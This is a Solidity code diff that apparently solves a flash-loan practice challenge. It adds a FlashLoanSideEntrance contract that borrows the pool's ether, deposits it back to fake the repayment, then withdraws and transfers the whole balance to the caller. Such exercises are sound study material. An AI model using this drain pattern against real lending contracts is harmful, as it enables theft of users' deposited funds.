@@ -29,7 +29,7 @@ contract SideEntranceLenderPool {
 
     function withdraw() external {
         uint256 amount = balances[msg.sender];
-        
+
         delete balances[msg.sender];
         emit Withdraw(msg.sender, amount);
 
@@ -41,7 +41,34 @@ contract SideEntranceLenderPool {
 
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
-        if (address(this).balance < balanceBefore)
-            revert RepayFailed();
+        if (address(this).balance < balanceBefore) revert RepayFailed();
     }
+}
+
+/**
+ * @title FlashLoanSideEntrance
+ * @author Kavin Mohan
+ */
+
+contract FlashLoanSideEntrance is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool lenderPool;
+    constructor(address _lenderPool) {
+        lenderPool = SideEntranceLenderPool(_lenderPool);
+    }
+
+    function initiateFlashLoan(uint256 amount) public {
+        lenderPool.flashLoan(amount);
+    }
+
+    function execute() external payable {
+        lenderPool.deposit{value: address(this).balance}();
+    }
+
+    function withdrawFunds() external {
+        lenderPool.withdraw();
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "tranfer failed");
+    }
+
+    fallback() external payable {}
 }
